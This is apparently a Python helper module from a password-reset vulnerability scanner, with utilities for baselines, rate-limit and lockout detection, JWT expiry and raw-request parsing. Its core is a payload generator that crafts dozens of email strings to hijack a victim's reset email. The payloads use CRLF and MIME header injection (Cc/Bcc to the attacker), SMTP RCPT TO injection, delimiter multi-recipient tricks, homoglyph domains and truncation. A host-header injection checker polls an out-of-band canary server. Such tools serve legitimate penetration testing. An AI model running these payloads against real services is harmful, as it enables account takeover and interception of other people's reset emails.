#!/usr/bin/env python3

import argparse  # noqa: F401
import base64
import random
import re  # noqa: F401
import os
import socket
import ssl
import string
import sys
import time
import json
import traceback  # noqa: F401
from urllib.parse import (
    urljoin,  # noqa: F401
    urlparse,
)
import requests
import secrets
import urllib3
from bs4 import BeautifulSoup
from bs4 import XMLParsedAsHTMLWarning

from utils.style import spinner
from utils.style import Colors 

import requests.utils

import warnings
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

def _noop_check_header_validity(header, value=None):
    return None

requests.utils.check_header_validity = _noop_check_header_validity

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


CONTENT_DELTA_RANGE = 500
BIG_CONTENT_DELTA_RANGE = 5000

EMAIL_REGEX = r"[a-zA-Z0-9._%+-]+(?:@|%40)[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

CANARY = secrets.token_hex(8)

## url tranformation ##
def get_domain_from_url(url: str) -> str:
    if not url:
        return ""
    domain = urlparse(url).netloc
    return domain if isinstance(domain, str) else domain.decode("utf-8", errors="replace")


def get_ip_from_url(url: str) -> str:
    domain = get_domain_from_url(url)
    ip = socket.gethostbyname(domain)
    return ip



## Timing requests ##

def human_time(human: str) -> None:
    if not human:
        return
    if human.isdigit():
        t = int(human)
        if t > 0:
            time.sleep(t)
    elif human.lower() in ("r", "random"):
        time.sleep(random.randrange(6))  # nosec B311


## Rate-limit awareness (avoids baseline drift false-positives) ##

RATE_LIMIT_KEYWORDS = [
    "too many", "rate limit", "ratelimit", "try again", "throttle",
    "too many requests", "slow down", "retry after", "quota exceeded",
    "please wait", "blocked",
]


## Anti-automation awareness (captcha / single-use tokens) ##

# Field names that are consumed after one use, making replay-based confirmation
# unreliable: the token is dead on request #2, but the server may still answer 200.
ANTI_AUTOMATION_MARKERS = [
    "g-recaptcha-response", "h-captcha-response", "cf-turnstile-response",
    "recaptcha", "hcaptcha", "turnstile", "captcha",
]


def detect_anti_automation(parsed_req) -> list[str]:
    """Return the anti-automation markers found in the request (body + headers)."""
    hay = (parsed_req.get("body") or "").lower()
    hay += " " + " ".join(f"{k}:{v}" for k, v in parsed_req.get("headers", {}).items()).lower()
    return [m for m in ANTI_AUTOMATION_MARKERS if m in hay]


## Auth / baseline-validity awareness ##

# If the baseline itself is an auth error, EVERY subsequent finding is meaningless
# (the endpoint is rejecting us, not processing the reset). Warn loudly.
AUTH_ERROR_MARKERS = [
    "unauthenticated", "unauthorized", "invalid credentials", "access denied",
    "not authenticated", "invalid token", "token expired", "expired token",
    "authentication required", "missing authentication", "forbidden",
]


def baseline_looks_error(baseline):
    """Return a short reason if the baseline response looks like an error/auth
    rejection (so findings would be invalid), else None."""
    if not baseline:
        return None
    st = baseline.get("status")
    body = (baseline.get("body") or "").lower()
    if st in (401, 403):
        return f"HTTP {st}"
    if isinstance(st, int) and st >= 500:
        return f"HTTP {st}"
    for m in AUTH_ERROR_MARKERS:
        if m in body:
            return m
    try:
        d = json.loads(baseline.get("body") or "")
        if isinstance(d, dict) and d.get("errors") and not d.get("data"):
            return "GraphQL errors (no data)"
    except Exception:
        pass
    return None


def detect_bearer_expiry(parsed_req):
    """
    If the request carries an Authorization: Bearer <JWT> whose `exp` is already
    past or expiring soon, return (label, seconds_left) where label is
    'expired' | 'expiring' | 'ok'. Else None.

    API reset endpoints (e.g. Salesforce Commerce SLAS) require a short-lived
    guest token; a scan that fires hundreds of requests will see it die mid-run,
    turning every later 'candidate' into noise — so flag it up front.
    """
    headers = parsed_req.get("headers", {}) if parsed_req else {}
    tok = None
    for k, v in headers.items():
        if k.lower() == "authorization" and isinstance(v, str) and v.lower().startswith("bearer "):
            tok = v.split(None, 1)[1].strip()
            break
    if not tok or tok.count(".") < 2:
        return None
    try:
        p = tok.split(".")[1]
        p += "=" * (-len(p) % 4)
        payload = json.loads(base64.urlsafe_b64decode(p))
    except Exception:
        return None
    exp = payload.get("exp")
    if not exp:
        return None
    left = int(exp) - int(time.time())
    if left <= 0:
        return ("expired", left)
    if left < 300:
        return ("expiring", left)
    return ("ok", left)


## Lockout / attempt-cap awareness (OTP brute-force resistance) ##

# Signals that the account/flow got locked after too many wrong attempts. Seeing
# one is GOOD (an attempt cap exists) — the OTP tester must stop immediately so it
# doesn't keep hammering (and to avoid locking the user's own account further).
LOCKOUT_KEYWORDS = [
    "account_suspended", "account is temporarily blocked", "temporarily blocked",
    "account locked", "account is locked", "too many attempts", "too many tries",
    "max attempts", "maximum attempts", "locked out", "compte bloqu",
    "compte verrouill", "trop de tentatives", "user_locked", "auth_blocked",
]


def detect_lockout(text) -> bool:
    """True if a response indicates the account/flow was locked after retries."""
    if not text:
        return False
    low = text.lower()
    return any(kw in low for kw in LOCKOUT_KEYWORDS)


## Reset-flow classification (link-based vs code/OTP-based) ##

# Markers that prove the reset is a CODE/OTP flow (user types a code back), where
# there is no emailed link to poison — so Host/X-Forwarded-Host link-poisoning is
# structurally N/A and the effort belongs on OTP strength + email-header injection.
RESET_FLOW_CODE_MARKERS = [
    "confirmation_code", "confirmationcode", "recover_password_confirmation_code",
    "verification_code", "verificationcode", "one_time_password", "onetimepassword",
    "\"otp\"", "otp_", "_otp", "enter the code", "enter your code", "code envoy",
    "saisissez le code", "passwordless", "nextaction",
]


def classify_reset_flow(baseline):
    """
    Best-effort: return 'code' when the trigger response clearly reveals a
    code/OTP flow, else None (unknown — most APIs don't reveal it in the response;
    the email is then the ground truth). Deliberately does NOT positively guess
    'link', since a link only appears in the delivered email, not the response.
    """
    if not baseline:
        return None
    body = (baseline.get("body") or "").lower()
    if any(m in body for m in RESET_FLOW_CODE_MARKERS):
        return "code"
    return None


def baseline_is_rate_limited(baseline) -> bool:
    """True if a baseline response dict looks rate-limited / throttled."""
    if not baseline:
        return False
    if baseline.get("status") == 429:
        return True
    body = (baseline.get("body") or "").lower()
    return any(kw in body for kw in RATE_LIMIT_KEYWORDS)


## Password-reset shared payloads / helpers ##

# Response body substrings that indicate a reset request was accepted.
SUCCESS_INDICATORS = [
    "success", "email sent", "password reset", "reset link",
    "check your email", "check your inbox", "lien envoy", "réinitialis",
    "mot de passe", "mail envoy", "correo enviado", "email gesendet",
    "sent you", "we have sent", "instructions", "recovery",
]

# Alternative parameter names an email value may be smuggled under.
EMAIL_ALT_PARAMS = [
    "Email", "mail", "username", "login", "emailAddress",
    "e-mail", "user_email", "to", "recipient",
]


def detect_content_type(headers):
    """Return 'json' | 'form' | 'multipart' | 'unknown' from request headers."""
    for k, v in headers.items():
        if k.lower() == "content-type":
            v_lower = v.lower()
            if "application/json" in v_lower:
                return "json"
            if "application/x-www-form-urlencoded" in v_lower:
                return "form"
            if "multipart/form-data" in v_lower:
                return "multipart"
    return "unknown"


def build_email_hijack_payloads(victim_email, attacker_email):
    """
    Build the union of email-parsing-differential payloads used to hijack a
    password-reset email: quoted/RFC-comment local parts, multiple @, percent
    hack, null/CRLF terminators, fullwidth/homoglyph @, sub-addressing, SMTP
    command injection, DB truncation, IDN homoglyph domains and gmail tricks.

    Returns an order-preserving, de-duplicated list of crafted email strings
    (the original victim address and no-op mutations are filtered out).
    """
    if "@" not in victim_email:
        return []

    v = victim_email
    vl, vd = v.split("@", 1)
    if "@" in attacker_email:
        al, ad = attacker_email.split("@", 1)
    else:
        al, ad = "attacker", attacker_email
    ae = attacker_email

    payloads = [
        # Case / whitespace
        v.upper(),
        v[0].upper() + v[1:],
        f"{vl.upper()}@{vd}",
        f"{vl}@{vd.upper()}",
        f" {v}",
        f"{v} ",
        f"\t{v}",
        f"{v}\t",
        f"{vl} @{vd}",
        f"{vl}@{vd} {ae}",

        # Null byte / terminators / CRLF
        f"{v}%00",
        f"{v}\x00",
        f"{v}%0a",
        f"{v}%00@{ad}",
        f"{v}%0d%0a@{ad}",

        # Quoted local part / RFC comments
        f'"{v}"@{ad}',
        f'"{vl}"@{vd}@{ad}',
        f"{vl}@{vd}({ad})",
        f"({ad}){vl}@{vd}",
        f'{vl}@{vd}\\"{ad}',

        # Multiple @
        f"{vl}@{ad}@{vd}",
        f"{vl}@{vd}@{ad}",

        # Percent hack
        f"{vl}%{vd}@{ad}",
        f"{vl}%{ad}@{vd}",

        # Double encoding / fullwidth @
        f"{vl}%2540{vd}",
        f"{vl}%40{vd}",
        v.replace("@", "﹫"),
        v.replace("@", "＠"),

        # Sub-addressing
        f"{vl}+{al}@{vd}",
        f"{vl}-{al}@{vd}",
        f"{vl}+@{vd}",
        f"{vl}+anything@{vd}",

        # Homoglyph in local part
        v.replace("a", "а", 1),

        # Multi-recipient via delimiters (mailer/library may split on these)
        f"{v} {ae}",
        f"{ae} {v}",
        f"{v},{ae}",
        f"{ae},{v}",
        f"{v};{ae}",
        f"{v}|{ae}",
        f"{v}%2C{ae}",          # percent-encoded comma
        f"{v}%20{ae}",          # percent-encoded space
        f'"{v}",{ae}',
        f"{v}\n{ae}",

        # Email-header (MIME) injection → carbon-copy the reset mail to the attacker
        f"{v}%0d%0aCc:{ae}",
        f"{v}%0d%0aBcc:{ae}",
        f"{v}%0aCc:{ae}",
        f"{v}%0aBcc:{ae}",
        f"{v}\r\nCc:{ae}",
        f"{v}\r\nBcc:{ae}",
        f"{v}%0d%0aReply-To:{ae}",

        # SMTP command injection
        f"{v}%0d%0aRCPT TO:<{ae}>",
        f"{v}%0d%0aDATA%0d%0a",
        f"{v}\r\nRCPT TO:<{ae}>",
    ]

    # Local-part dot insertion (needs at least 2 chars)
    if len(vl) >= 2:
        payloads.append(f"{vl[0]}.{vl[1:]}@{vd}")

    # DB truncation
    pad_255 = max(0, 252 - len(v))
    if pad_255 > 0:
        payloads.append(f"{vl}{'a' * pad_255}@{ad}")
    pad_64 = max(0, 61 - len(vl))
    if pad_64 > 0:
        payloads.append(f"{vl}{'a' * pad_64}@{ad}")

    # IDN homoglyph domain
    for char_l, char_c in [("a", "а"), ("e", "е"), ("o", "о")]:
        if char_l in vd:
            payloads.append(f"{vl}@{vd.replace(char_l, char_c, 1)}")

    # Unicode dots in domain
    if "." in vd:
        parts = vd.split(".")
        payloads.append(f"{vl}@{chr(0x3002).join(parts)}")
        payloads.append(f"{vl}@{chr(0xFF0E).join(parts)}")

    # Gmail specific
    if "gmail" in vd.lower():
        payloads.append(".".join(vl) + f"@{vd}")
        payloads.append(f"{vl}@googlemail.com")
    elif "googlemail" in vd.lower():
        payloads.append(f"{vl}@gmail.com")

    seen = set()
    unique = []
    for p in payloads:
        if p and p != v and p not in seen:
            seen.add(p)
            unique.append(p)
    return unique


def check_raw_response(raw_resp, interactdom, baseline, payload, interact, canary, path):
    """
    Inspect a raw-socket response string for host / absolute-URI injection
    indicators: reflection of the attacker domain, status anomaly vs baseline,
    and an out-of-band canary/path hit on the interact server.
    """
    if interactdom and interactdom in raw_resp:
        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in raw response {Colors.RESET}| PAYLOAD: {payload}")

    status_match = re.search(r"HTTP/[\d.]+ (\d{3})", raw_resp)
    if status_match:
        status_code = int(status_match.group(1))
        # 421 (Misdirected Request) & other rejections aren't HHI signals — a wrong
        # Host over HTTP/2 legitimately 421s, so a whole run of them is just noise.
        if status_code != baseline['status'] and status_code not in (400, 401, 403, 404, 405, 421, 429, 500, 502, 503, 504):
            print(f"{Colors.YELLOW}   └── [{baseline['status']} > {status_code}] {Colors.RESET}| PAYLOAD: {payload}")

    if interact:
        try:
            req_interact = requests.get(interact, verify=False, allow_redirects=False, timeout=10)
            if req_interact.status_code == 200:
                if canary in req_interact.text:
                    print(f"{Colors.GREEN}   └── [+] canary '{canary}' caught on {interact} {Colors.RESET}| PAYLOAD: {payload}")
                if path in req_interact.text:
                    print(f"{Colors.GREEN}   └── [+] path '{path}' caught on {interact} {Colors.RESET}| PAYLOAD: {payload}")
        except requests.RequestException:
            pass



## Anti FP ##

def range_exclusion(main_len):
    range_exlusion = (
        range(main_len - CONTENT_DELTA_RANGE, main_len + CONTENT_DELTA_RANGE)
        if main_len < 10000
        else range(
            main_len - BIG_CONTENT_DELTA_RANGE,
            main_len + BIG_CONTENT_DELTA_RANGE,
        )
    )
    return range_exlusion


def fp_baseline(url, s):
    uri = f"{url}{random.randint(1, 99)}"
    headers = {"X-Random-azertyuiop":"azertyuiop"}
    req = s.get(uri, headers=headers, allow_redirects=False, timeout=10)

    fp_base_status = req.status_code
    fp_base_len = len(req.content)
    return fp_base_status, fp_base_len
    

## requests settings ##

def parse_headers(header_list: list[str] | None) -> dict[str, str]:
    headers = {}
    if header_list:
        for header in header_list:
            if ":" in header:
                key, value = header.split(":", 1)
                headers[key.strip()] = value.strip()
    return headers
    


def parse_raw_request(filepath):
    with open(filepath, "r", newline="") as f:
        raw = f.read()

    # Handle both CRLF (Burp exports) and LF line endings
    parts = re.split(r'\r?\n\r?\n', raw, 1)
    header_section = parts[0]
    body = parts[1].strip() if len(parts) > 1 else ""

    lines = [l.rstrip("\r") for l in header_section.strip().splitlines()]
    request_line = lines[0].strip()
    match = re.match(
        r"^(GET|POST|PUT|PATCH|DELETE|OPTIONS)\s+(\S+)\s+HTTP/[\d.]+$",
        request_line,
    )
    if not match:
        print(f"{Colors.RED}[!] Invalid request line: {request_line}{Colors.RESET}")
        sys.exit(1)

    method = match.group(1)
    path = match.group(2)

    headers = {}
    original_host = None
    for line in lines[1:]:
        line = line.strip()
        if not line:
            continue
        if ":" in line:
            key, val = line.split(":", 1)
            key, val = key.strip(), val.strip()
            if key.lower() == "host":
                original_host = val
            headers[key] = val

    if not original_host:
        print(f"{Colors.RED}[!] No Host header found in raw request{Colors.RESET}")
        sys.exit(1)

    return {"method": method, "path": path, "headers": headers, "body": body, "host": original_host}